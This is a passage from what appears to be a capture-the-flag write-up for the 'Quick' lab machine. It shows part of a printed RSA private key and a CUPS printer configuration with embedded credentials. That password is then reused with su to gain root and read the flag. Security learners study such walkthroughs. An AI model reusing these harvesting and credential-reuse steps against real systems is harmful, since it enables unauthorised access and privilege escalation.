  LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
  2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
  x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
  +DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
  NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
  -----END RSA PRIVATE KEY-----
  VA
```

Luckily, there is also a private key stored in the `.ssh` directory.

### 5.5 Connecting via SSH with `sysadm`

---

## PART 6 : PRIVILEGE ESCALATION

```shell
srvadm@quick:~/.cache/conf.d$ cat printers.conf
```

```xml
  # Printer configuration file for CUPS v2.3.0
  # Written by cupsd on 2020-02-18 17:11
  # DO NOT EDIT THIS FILE WHEN CUPSD IS RUNNING
  NextPrinterId 5
  [...omitted...]
  <Printer OLD_Aviatar>
  PrinterId 2
  UUID urn:uuid:0929509f-7173-3afd-6be2-4da0a43ccefe
  Info 8595
  Location Aviatar
  MakeModel KONICA MINOLTA C554SeriesPS(P)
  DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
  State Idle
  StateTime 1549274624
  ConfigTime 1549274625
  Type 8401100
  Accepting Yes
  Shared Yes
  JobSheets none none
  QuotaPeriod 0
  PageLimit 0
  KLimit 0
  OpPolicy default
  ErrorPolicy stop-printer
  Option job-cancel-after 10800
  Option media 1
  Option output-bin 0
  Option print-color-mode color
  Option print-quality 5
  </Printer>
  [...omitted...]
```



```shell
srvadm@quick:~/.cache/conf.d$ su -

  Password: &ftQ4K3SGde8?

root@quick:~# cat /root/root.txt

  8289e54cd2bd1b9db9fc54447fea0db2
```

---

## PART 7 : REFERENCES

- https://www.google.com/search?client=firefox-b-d&q=quic+udp+port
- https://github.com/curl/curl/blob/master/docs/HTTP3.md

- https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/